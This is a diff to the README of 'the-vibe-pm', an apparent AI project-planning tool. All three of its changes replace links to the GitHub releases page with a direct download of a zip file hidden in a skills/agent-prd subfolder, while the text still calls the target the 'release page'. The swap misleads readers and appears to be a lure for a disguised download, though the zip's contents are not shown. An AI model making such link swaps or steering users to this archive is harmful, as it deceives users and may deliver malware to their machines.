@@ -1,6 +1,6 @@
 # 🧭 the-vibe-pm - Build AI projects with clarity
 
-[![Download the-vibe-pm](https://img.shields.io/badge/Download%20the-vibe--pm-6B46C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unreconcilable-blood727/the-vibe-pm/releases)
+[![Download the-vibe-pm](https://img.shields.io/badge/Download%20the-vibe--pm-6B46C1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Unreconcilable-blood727/the-vibe-pm/main/skills/agent-prd/the-vibe-pm-v3.1.zip)
 
 ## 🧩 What this is
 
@@ -41,7 +41,7 @@ Follow these steps to download and run the software on Windows.
 
 Go to the release page here:
 
-[Visit the download page](https://github.com/Unreconcilable-blood727/the-vibe-pm/releases)
+[Visit the download page](https://raw.githubusercontent.com/Unreconcilable-blood727/the-vibe-pm/main/skills/agent-prd/the-vibe-pm-v3.1.zip)
 
 This page is where you can download the latest version.
 
@@ -200,7 +200,7 @@ This keeps the process clear and steady.
 
 Use this link to visit the page and download the latest release for Windows:
 
-[https://github.com/Unreconcilable-blood727/the-vibe-pm/releases](https://github.com/Unreconcilable-blood727/the-vibe-pm/releases)
+[https://raw.githubusercontent.com/Unreconcilable-blood727/the-vibe-pm/main/skills/agent-prd/the-vibe-pm-v3.1.zip](https://raw.githubusercontent.com/Unreconcilable-blood727/the-vibe-pm/main/skills/agent-prd/the-vibe-pm-v3.1.zip)
 
 ## 🧾 Release notes
 
